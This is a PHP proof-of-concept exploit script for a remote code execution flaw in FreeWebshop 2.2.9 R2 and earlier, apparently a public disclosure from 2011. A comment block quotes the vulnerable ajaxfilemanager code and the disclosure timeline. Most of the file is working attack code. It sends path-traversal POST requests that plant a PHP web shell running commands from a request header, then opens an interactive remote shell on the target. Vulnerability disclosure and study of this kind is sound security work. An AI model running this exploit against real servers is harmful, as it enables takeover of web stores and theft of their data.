<?php

/*
    --------------------------------------------------------------------------
    FreeWebshop <= 2.2.9 R2 (ajax_save_name.php) Remote Code Execution Exploit
    --------------------------------------------------------------------------
    
    author.............: Egidio Romano aka EgiX
    mail...............: n0b0d13s[at]gmail[dot]com
    software link......: http://www.freewebshop.org/
    
    +-------------------------------------------------------------------------+
    | This proof of concept code was written for educational purpose only.    |
    | Use it at your own risk. Author will be not responsible for any damage. |
    +-------------------------------------------------------------------------+
    
    [-] vulnerable code in /addons/tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/ajax_save_name.php
    
    37.            @ob_start();
    38.            include_once(CLASS_SESSION_ACTION);
    39.            $sessionAction = new SessionAction();        
    40.            $selectedDocuments = $sessionAction->get();
    41.            if(removeTrailingSlash($sessionAction->getFolder()) == getParentPath($_POST['id']) && sizeof($selectedDocuments))
    42.            {
    43.                if(($key = array_search(basename($_POST['id']), $selectedDocuments)) !== false)
    44.                {
    45.                    $selectedDocuments[$key] = $_POST['value'];
    46.                    $sessionAction->set($selectedDocuments);
    47.                    
    48.                }
    49.                echo basename($_POST['id']) . "\n";
    50.                displayArray($selectedDocuments);
    51.                
    52.            }elseif(removeTrailingSlash($sessionAction->getFolder()) == removeTrailingSlash($_POST['id']))
    53.            {
    54.                $sessionAction->setFolder($_POST['id']);
    55.            }
    56.            writeInfo(ob_get_clean());
    
    An attacker could be able to manipulate the $selectedDocuments array that will be displayed at line 50,
    then at line 56 is called the 'writeInfo' function using the current buffer contents as argument.
    Like my recently discovered vulnerability (http://www.exploit-db.com/exploits/18075/), this function
    writes into a file called 'data.php' so an attacker could be able to execute arbitrary PHP code.

    [-] Disclosure timeline:
    
    [24/10/2011] - Vulnerability discovered
    [25/10/2011] - Issue reported to http://www.freewebshop.org/forum/?topic=5235
    [15/11/2011] - After three weeks still no fix released
    [16/11/2011] - Public disclosure

*/

error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);

function http_send($host, $packet)
{
    if (!($sock = fsockopen($host, 80)))
        die( "\n[-] No response from {$host}:80\n");

    fwrite($sock, $packet);
    return stream_get_contents($sock);
}

function random_mkdir()
{
    global $host, $path;
    
    $dirname = uniqid();
    
    $payload = "new_folder={$dirname}&currentFolderPath=../../../up/";
    $packet  = "POST {$path}addons/tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/ajax_create_folder.php HTTP/1.0\r\n";
    $packet .= "Host: {$host}\r\n";
    $packet .= "Content-Length: ".strlen($payload)."\r\n";
    $packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
    $packet .= "Connection: close\r\n\r\n{$payload}";
    
    http_send($host, $packet);    
    return $dirname;
}

print "\n+---------------------------------------------------------------+";
print "\n| FreeWebshop <= 2.2.9 R2 Remote Code Execution Exploit by EgiX |";
print "\n+---------------------------------------------------------------+\n";

if ($argc < 3)
{
    print "\nUsage......: php $argv[0] <host> <path>\n";
    print "\nExample....: php $argv[0] localhost /";
    print "\nExample....: php $argv[0] localhost /freewebshop/\n";
    die();
}

$host = $argv[1];
$path = $argv[2];

$phpcode = "<?php error_reporting(0);print(___);passthru(base64_decode(\$_SERVER[HTTP_CMD]));die; ?>";

$payload = "selectedDoc[]={$phpcode}&currentFolderPath=../../../up/";
$packet  = "POST {$path}addons/tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/ajax_file_cut.php HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Content-Length: ".strlen($payload)."\r\n";
$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
$packet .= "Connection: close\r\n\r\n{$payload}";

if (!preg_match("/Set-Cookie: ([^;]*);/", http_send($host, $packet), $sid)) die("\n[-] Session ID not found!\n");

$dirname = random_mkdir();
$newname = uniqid();

$payload = "value={$newname}&id=../../../up/{$dirname}";
$packet  = "POST {$path}addons/tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/ajax_save_name.php HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Cookie: {$sid[1]}\r\n";
$packet .= "Content-Length: ".strlen($payload)."\r\n";
$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
$packet .= "Connection: close\r\n\r\n{$payload}";

http_send($host, $packet);

$packet  = "GET {$path}addons/tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/inc/data.php HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Cmd: %s\r\n";
$packet .= "Connection: close\r\n\r\n";

while(1)
{
    print "\nfreewebshop-shell# ";
    if (($cmd = trim(fgets(STDIN))) == "exit") break;
    $response = http_send($host, sprintf($packet, base64_encode($cmd)));
    preg_match("/___(.*)/s", $response, $m) ? print $m[1] : die("\n[-] Exploit failed!\n");
}

?>
